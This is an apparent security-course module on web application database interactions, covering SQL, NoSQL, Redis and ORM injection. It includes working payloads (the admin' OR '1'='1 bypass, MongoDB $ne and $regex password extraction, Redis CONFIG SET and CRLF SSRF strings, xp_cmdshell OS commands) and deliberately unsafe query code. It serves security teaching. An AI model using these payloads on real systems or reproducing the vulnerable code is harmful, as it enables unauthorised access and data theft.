# Database Interactions

## Unit 2: Web Application Architecture — Topic 4

## 🎯 Overview

Databases store the most valuable data in web applications — user credentials, personal information, financial records. Understanding how web applications interact with databases is critical for identifying and exploiting injection vulnerabilities. This topic covers database types, query mechanisms, ORM patterns, and the attack surface at the data layer.

---

## 1. Database Types and Their Attack Surface

```
┌──────────────────────────────────────────────────────────────┐
│                    DATABASE LANDSCAPE                          │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  Relational (SQL)         NoSQL                              │
│  ┌──────────────┐        ┌──────────────┐                   │
│  │  MySQL       │        │  MongoDB     │ ← NoSQL injection │
│  │  PostgreSQL  │        │  CouchDB     │                   │
│  │  SQL Server  │        │  Redis       │ ← Command injection│
│  │  Oracle      │        │  Cassandra   │                   │
│  │  SQLite      │        │  DynamoDB    │                   │
│  └──────────────┘        └──────────────┘                   │
│  ↑ SQL injection          ↑ Operator injection               │
│                                                              │
│  In-Memory                Graph                              │
│  ┌──────────────┐        ┌──────────────┐                   │
│  │  Redis       │        │  Neo4j       │ ← Cypher injection│
│  │  Memcached   │        │  ArangoDB    │                   │
│  └──────────────┘        └──────────────┘                   │
└──────────────────────────────────────────────────────────────┘
```

---

## 2. How Web Apps Query Databases

### Direct SQL Queries (Vulnerable)

```
┌──────────────────────────────────────────────────────────────┐
│  User Input → String Concatenation → SQL Query → Database    │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  User enters: admin' OR '1'='1                              │
│                                                              │
│  Backend code (PHP):                                         │
│  $query = "SELECT * FROM users WHERE                         │
│            username = '" . $_POST['user'] . "'               │
│            AND password = '" . $_POST['pass'] . "'";         │
│                                                              │
│  Resulting query:                                            │
│  SELECT * FROM users WHERE username = 'admin' OR '1'='1'    │
│  AND password = ''                                           │
│                                                              │
│  ⚠ Returns ALL users — authentication bypassed!              │
└──────────────────────────────────────────────────────────────┘
```

### Parameterized Queries (Secure)

```
┌──────────────────────────────────────────────────────────────┐
│  User Input → Parameter Binding → SQL Query → Database       │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  User enters: admin' OR '1'='1                              │
│                                                              │
│  Backend code (PHP - PDO):                                   │
│  $stmt = $pdo->prepare("SELECT * FROM users WHERE            │
│           username = ? AND password = ?");                    │
│  $stmt->execute([$_POST['user'], $_POST['pass']]);           │
│                                                              │
│  Resulting query:                                            │
│  SELECT * FROM users WHERE                                   │
│  username = 'admin\' OR \'1\'=\'1'                          │
│  AND password = ''                                           │
│                                                              │
│  ✓ Input treated as data, not code — injection prevented     │
└──────────────────────────────────────────────────────────────┘
```

---

## 3. ORM and Abstraction Layers

```
┌──────────────────────────────────────────────────────────────┐
│                    ORM LAYER                                  │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  Application Code                                            │
│       │                                                      │
│       ▼                                                      │
│  ┌─────────────────────────┐                                │
│  │  ORM (Object-Relational │                                │
│  │       Mapping)          │                                │
│  │  Django ORM, SQLAlchemy │                                │
│  │  Hibernate, Sequelize   │                                │
│  │  ActiveRecord, EF Core  │                                │
│  └────────────┬────────────┘                                │
│               │ Generates parameterized SQL                  │
│               ▼                                              │
│  ┌─────────────────────────┐                                │
│  │      Database           │                                │
│  └─────────────────────────┘                                │
│                                                              │
│  ORMs generally prevent SQL injection BUT:                   │
│  • Raw query methods bypass ORM protection                   │
│  • ORM-specific injection may exist                          │
│  • Misconfigured ORM can leak data                           │
└──────────────────────────────────────────────────────────────┘
```

### ORM Bypass Examples

```python
# Django ORM - safe
User.objects.filter(username=input_user)

# Django ORM - raw query (UNSAFE if not parameterized)
User.objects.raw("SELECT * FROM users WHERE name = '%s'" % user_input)

# SQLAlchemy - safe
session.query(User).filter(User.name == user_input)

# SQLAlchemy - text query (potentially unsafe)
session.execute(text(f"SELECT * FROM users WHERE name = '{user_input}'"))
```

---

## 4. NoSQL Database Attacks

### MongoDB Injection

```bash
# Normal login
POST /login
{"username": "admin", "password": "secret"}

# MongoDB operator injection
POST /login
{"username": "admin", "password": {"$ne": ""}}
# Matches where password is NOT empty → bypass

# Other NoSQL operators to abuse:
# {"$gt": ""}       → Greater than empty string
# {"$regex": ".*"}  → Matches everything
# {"$exists": true} → Field exists
# {"$in": ["admin","root"]}  → Match any in array

# Data extraction via regex
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
# Character-by-character extraction
```

### Redis Command Injection

```bash
# If application passes user input to Redis commands
# EVAL "return redis.call('GET', KEYS[1])" 1 user_input

# Attacker input:
# x") redis.call("CONFIG","SET","dir","/var/www") --

# Redis SSRF via CRLF injection
curl "https://target.com/proxy?url=http://redis:6379/%0D%0ASET%20key%20value"
```

---

## 5. Database Enumeration

```bash
# Identify database type from error messages
# MySQL:   "You have an error in your SQL syntax"
# MSSQL:   "Unclosed quotation mark"
# Oracle:  "ORA-01756: quoted string not properly terminated"
# PostgreSQL: "ERROR: syntax error at or near"

# Database-specific techniques
# MySQL version: SELECT @@version
# MSSQL version: SELECT @@VERSION
# PostgreSQL:    SELECT version()
# Oracle:        SELECT banner FROM v$version

# Database fingerprinting via sqlmap
sqlmap -u "https://target.com/page?id=1" --banner
```

---

## 6. Stored Procedures and Functions

```sql
-- Dangerous stored procedures (MSSQL)
-- xp_cmdshell: Execute OS commands
EXEC xp_cmdshell 'whoami';

-- xp_dirtree: List directory contents
EXEC xp_dirtree 'C:\';

-- sp_oacreate: Create COM objects
EXEC sp_oacreate 'wscript.shell', @shell OUTPUT;

-- If SQL injection is found and these are enabled:
-- Direct OS command execution is possible!
```

---

## 📊 Summary Table

| Database Type | Injection Type | Detection Method |
|--------------|---------------|-----------------|
| MySQL | SQL injection | `'` → syntax error |
| PostgreSQL | SQL injection | `'` → ERROR near |
| MSSQL | SQL injection | `'` → unclosed quotation |
| MongoDB | Operator injection | `{"$ne":""}` bypass |
| Redis | Command injection | CRLF in input |
| Neo4j | Cypher injection | `'` in graph queries |

---

## ❓ Revision Questions

1. What is the difference between string concatenation and parameterized queries?
2. How can ORM raw query methods introduce SQL injection?
3. How does MongoDB operator injection bypass authentication?
4. What database-specific error messages help identify the DB type?
5. Why are MSSQL stored procedures like `xp_cmdshell` dangerous?
6. How does Redis command injection work through web applications?

---

*Previous: [03-backend-technologies.md](03-backend-technologies.md) | Next: [05-api-architectures.md](05-api-architectures.md)*

---

*[Back to README](../README.md)*
